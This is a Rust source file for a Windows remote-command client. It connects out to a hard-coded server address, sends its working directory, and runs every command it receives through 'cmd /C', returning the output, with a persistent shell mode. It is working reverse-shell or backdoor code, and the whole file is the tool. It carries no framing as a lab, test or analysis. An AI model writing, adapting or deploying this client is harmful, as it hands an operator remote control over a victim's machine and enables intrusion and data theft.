use std::env;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() -> std::io::Result<()> {
    let mut stream = TcpStream::connect("127.0.0.1:7878")?;
    println!("Connected to the server");

    send_working_directory(&mut stream)?;

    let mut current_directory = env::current_dir().unwrap_or_else(|_| "C:\\".into());

    loop {
        let mut buffer = vec![0; 4096];
        match stream.read(&mut buffer) {
            Ok(bytes_read) if bytes_read > 0 => {
                let command = String::from_utf8_lossy(&buffer[..bytes_read])
                    .trim()
                    .to_string();

                if command == "exit" {
                    println!("Received exit command, shutting down.");
                    break;
                } else if command == "shell" {
                    println!("Entering persistent shell mode.");

                    loop {
                        let mut shell_buffer = vec![0; 4096];
                        match stream.read(&mut shell_buffer) {
                            Ok(bytes_read) if bytes_read > 0 => {
                                let shell_command =
                                    String::from_utf8_lossy(&shell_buffer[..bytes_read])
                                        .trim()
                                        .to_string();

                                if shell_command == "exit" {
                                    println!("Exiting shell mode.");
                                    break;
                                }

                                execute_and_send_response(
                                    &mut stream,
                                    &shell_command,
                                    &mut current_directory,
                                )?;
                            }
                            Ok(_) => {
                                println!("Server disconnected.");
                                break;
                            }
                            Err(e) => {
                                eprintln!("Failed to read from server: {}", e);
                                break;
                            }
                        }
                    }
                } else if command.starts_with("exec") {
                    execute_and_send_response(&mut stream, &command[5..], &mut current_directory)?;
                } else {
                    let unknown_command_response = b"Unknown command received<END>";
                    stream
                        .write_all(unknown_command_response)
                        .expect("Failed to send response");
                }
            }
            Ok(_) => {
                println!("Server disconnected.");
                break;
            }
            Err(e) => {
                eprintln!("Failed to read from server: {}", e);
                break;
            }
        }
    }
    Ok(())
}

// Helper function to send the current working directory
fn send_working_directory(stream: &mut TcpStream) -> io::Result<()> {
    let cwd = env::current_dir().unwrap_or_else(|_| "C:\\".into());
    let cwd_message = format!("WORKDIR:{}<END>", cwd.display());
    stream.write_all(cwd_message.as_bytes())?;
    Ok(())
}

// New helper function to execute commands and send both stdout and stderr to the server
fn execute_and_send_response(
    stream: &mut TcpStream,
    command: &str,
    current_directory: &mut std::path::PathBuf,
) -> io::Result<()> {
    let output = Command::new("cmd")
        .args(["/C", command])
        .output()
        .expect("Failed to execute command");

    let new_directory = env::current_dir().unwrap_or_else(|_| "C:\\".into());
    if new_directory != *current_directory {
        *current_directory = new_directory.clone();
        send_working_directory(stream)?; // Update server with new working directory
    }

    // Prepare the response based on command output
    let response = if !output.stdout.is_empty() {
        let mut response = output.stdout;
        response.extend_from_slice(b"<END>");
        response
    } else if !output.stderr.is_empty() {
        let mut response = output.stderr; // Send stderr if stdout is empty
        response.extend_from_slice(b"<END>");
        response
    } else {
        b"<END>".to_vec() // Send only <END> if there's no output
    };

    stream.write_all(&response)?;
    Ok(())
}
